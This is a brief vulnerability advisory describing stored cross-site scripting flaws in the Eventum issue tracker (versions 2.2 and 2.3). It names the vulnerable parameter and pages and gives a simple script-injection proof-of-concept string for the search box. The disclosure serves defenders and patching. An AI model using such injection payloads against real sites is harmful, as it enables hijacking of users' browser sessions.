Oracle MySQL Eventum 2.3 Remote Script Insertion Vulnerabilities


Vendor: MySQL AB / Oracle Corporation
Product web page: http://forge.mysql.com/wiki/Eventum
Affected version: 2.2 and 2.3

Summary: Eventum is a user-friendly and flexible issue tracking system that can
be used by a support department to track incoming technical support requests, or
by a software development team to quickly organize tasks and bugs.

Desc: Eventum suffers from a cross-site scripting vulnerability. The persistent
(stored) XSS issue is triggered when input passed via the 'keywords' parameter
to the list.php script is not properly sanitized before being returned to the
user. This can be exploited to execute arbitrary HTML and script code in a user's
browser session in context of an affected site. Or, you can trigger the issue
when parsing the string '<script>alert(1)</script>' into the search box and it
will be stored every time you navigate back to the list.php page. If there's
no activity the stored string will self execute every 5 minutes.
'forgot_password.php' and 'select_project.php' are also vulnerable because
they fail to perform filtering when using the REQUEST_URI variable.
